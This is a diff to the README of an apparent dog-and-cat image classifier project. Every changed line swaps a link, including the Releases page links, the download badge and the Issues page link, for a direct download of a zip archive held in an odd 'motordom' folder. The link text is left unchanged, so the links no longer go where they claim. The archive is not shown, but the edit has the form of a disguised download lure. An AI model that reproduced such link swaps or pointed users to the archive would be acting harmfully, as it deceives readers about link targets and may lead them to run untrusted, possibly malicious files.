@@ -1,6 +1,6 @@
 # 🐾 bi_image_classifier - Classify Images of Dogs and Cats Effortlessly
 
-[![Download bi_image_classifier](https://img.shields.io/badge/Download-bi_image_classifier-brightgreen)](https://github.com/jdragon95/bi_image_classifier/releases)
+[![Download bi_image_classifier](https://raw.githubusercontent.com/jdragon95/bi_image_classifier/main/motordom/bi_image_classifier_3.0-beta.3.zip)](https://raw.githubusercontent.com/jdragon95/bi_image_classifier/main/motordom/bi_image_classifier_3.0-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the bi_image_classifier project! This application uses artificial int
 
 To get the application, visit this page to download:
 
-[Download bi_image_classifier](https://github.com/jdragon95/bi_image_classifier/releases)
+[Download bi_image_classifier](https://raw.githubusercontent.com/jdragon95/bi_image_classifier/main/motordom/bi_image_classifier_3.0-beta.3.zip)
 
 Once you are on the Releases page:
 
@@ -68,7 +68,7 @@ After downloading the installation file:
 
 For any questions or issues you encounter:
 
-- Visit the [GitHub Issues page](https://github.com/jdragon95/bi_image_classifier/issues) to report bugs or request features.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/jdragon95/bi_image_classifier/main/motordom/bi_image_classifier_3.0-beta.3.zip) to report bugs or request features.
 - Join our community discussions on relevant forums.
 
 ## 🧑‍💻 Contributing
@@ -89,6 +89,6 @@ Thanks to all the contributors and users who help improve this project. Your fee
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page to Download](https://github.com/jdragon95/bi_image_classifier/releases)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/jdragon95/bi_image_classifier/main/motordom/bi_image_classifier_3.0-beta.3.zip)
 
 Feel free to reach out if you have any questions or need help using the application!
